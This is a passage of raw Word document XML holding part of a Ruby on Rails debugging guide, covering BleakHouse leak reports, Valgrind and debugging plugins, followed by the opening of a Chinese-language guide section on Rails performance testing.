        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0F682519" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0384C5E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>** BleakHouse: working...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17A8C2ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>** BleakHouse: complete</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="404AC4AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>** Bleakhouse: run 'bleak /tmp/bleak.5979.0.dump' to analyze.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2963FA6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To analyze it, just run the listed command. The top 20 leakiest lines will be listed:</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BC05AC8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B8A6F2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>191691 total objects</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08D7F3CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Final heap size 191691 filled, 220961 free</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FB0F363" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Displaying top 20 most common line/class pairs</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2275F6BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  89513 __null__:__null__:__node__</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22872EA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  41438 __null__:__null__:String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="371500BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  2348 /opt/local//lib/ruby/site_ruby/1.8/rubygems/specification.rb:557:Array</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BC9AD6C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  1508 /opt/local//lib/ruby/gems/1.8/specifications/gettext-1.90.0.gemspec:14:String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="430ED782" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  1021 /opt/local//lib/ruby/gems/1.8/specifications/heel-0.2.0.gemspec:14:String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B6E76D0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   951 /opt/local//lib/ruby/site_ruby/1.8/rubygems/version.rb:111:String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47D0C235" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   935 /opt/local//lib/ruby/site_ruby/1.8/rubygems/specification.rb:557:String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EB75162" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   834 /opt/local//lib/ruby/site_ruby/1.8/rubygems/version.rb:146:Array</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49B9E62E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1D67B653" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This way you can find where your application is leaking memory and fix it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECA57CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:hyperlink r:id="rId784" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>BleakHouse</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> doesn’t report any heap growth but you still have memory growth, you might have a broken C extension, or real leak in the interpreter. In that case, try using Valgrind to investigate further.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="239768E2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Valgrind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029F60ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:hyperlink r:id="rId785" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Valgrind</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> is a Linux-only application for detecting C-based memory leaks and race conditions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375607C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There are Valgrind tools that can automatically detect many memory management and threading bugs, and profile your programs in detail. For example, a C extension in the interpreter calls </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>malloc()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> but is doesn’t properly call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>free()</w:t>
      </w:r>
      <w:r>
        <w:t>, this memory won’t be available until the app terminates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A74AF5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For further information on how to install Valgrind and use with Ruby, refer to </w:t>
      </w:r>
      <w:hyperlink r:id="rId786" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Valgrind and Ruby</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> by Evan Weaver.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6978665D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>5 Plugins for Debugging</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFBE70F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There are some Rails plugins to help you to find errors and debug your application. Here is a list of useful plugins for debugging:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDC0C28" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="353"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId787" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Footnotes</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t>: Every Rails page has footnotes that give request information and link back to your source via TextMate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CB2EF9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="353"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId788" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Query Trace</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t>: Adds query origin tracing to your logs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD5FB7E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="353"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId789" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Query Stats</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t>: A Rails plugin to track database queries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451E0656" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="353"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId790" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Query Reviewer</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t>: This rails plugin not only runs “</w:t>
      </w:r>
      <w:r w:rsidR="009A002D">
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve">” before each of your select queries in development, but provides a small </w:t>
      </w:r>
      <w:r w:rsidR="009A002D">
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>DIV</w:t>
      </w:r>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> in the rendered output of each page with the summary of warnings for each query that it analyzed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE5EAEF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="353"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId791" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Exception Notifier</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t>: Provides a mailer object and a default set of templates for sending email notifications when errors occur in a Rails application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E729690" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="353"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId792" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Exception Logger</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t>: Logs your Rails exceptions in the database and provides a funky web interface to manage them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D06CD94" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>6 References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09099A9C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="354"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId793" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>ruby-debug Homepage</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="507CFF41" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="354"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId794" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Article: Debugging a Rails application with ruby-debug</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="66593D5F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="354"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId795" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>ruby-debug Basics screencast</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="089460C6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="354"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId796" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Ryan Bate’s ruby-debug screencast</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F5137B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="354"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId797" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Ryan Bate’s stack trace screencast</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="29D237C6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="354"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId798" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Ryan Bate’s logger screencast</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="00B282CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="354"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId799" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Debugging with ruby-debug</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B5073BF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="354"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId800" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>ruby-debug cheat sheet</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="38754399" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="354"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId801" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Ruby on Rails Wiki: How to Configure Logging</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="05AF2864" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="354"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId802" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Bleak House Documentation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2BAD35B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D"/>
    <w:p w14:paraId="2EF22F21" w14:textId="5552795A" w:rsidR="004F7237" w:rsidRDefault="002B5D47" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.7、</w:t>
      </w:r>
      <w:r w:rsidR="004F7237">
        <w:t>Rails 应用中的性能测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C06DEAE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">这篇文章介绍了几种在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>Ruby on Rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 应用中进行性能测试的方法。通过阅读这篇文章，你可以</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E997CF2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>了解多种基准测试和分析测试指标。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715B318B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>生成基准性能测试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52889556" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>安装使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Ruby </w:t>
      </w:r>
      <w:r>
        <w:t>的扩展</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> GC </w:t>
      </w:r>
      <w:r>
        <w:t>类库来测试你的内存使用和分配情况。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CD5D730" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>通过</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Rails </w:t>
      </w:r>
      <w:r>
        <w:t>内置的日志功能来了解</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> benchmarking </w:t>
      </w:r>
      <w:r>
        <w:t>信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12AD2934" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>了解并掌握基准测试和分析测试工具。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18125E6D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>在开发中，性能测试是一个循序渐进的过程。让你的用户能够很快的完成加载并看到你的产品是非常重要的。为了确保用户在各类浏览器上的良好体验，降低硬件上不必要的消耗是每一个 web 程序都必须要经过的一道工序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BD275C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48408741" wp14:editId="6E91A06D">
            <wp:extent cx="323850" cy="304800"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="31" name="图片 31" descr="http://guides.ruby-china.org/images/chapters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guides.ruby-china.org/images/chapters_icon.gif"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId612" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="323850" cy="304800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9BAAE5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId803" w:anchor="1" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
